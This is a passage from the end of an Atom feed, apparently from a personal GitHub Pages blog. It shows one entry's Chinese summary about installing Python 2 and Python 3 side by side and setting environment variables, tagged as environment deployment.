&lt;p&gt;同时安装Python2和Python3的版本并配置环境变量&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="环境部署" scheme="http://lingxin16.github.io/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
</feed>
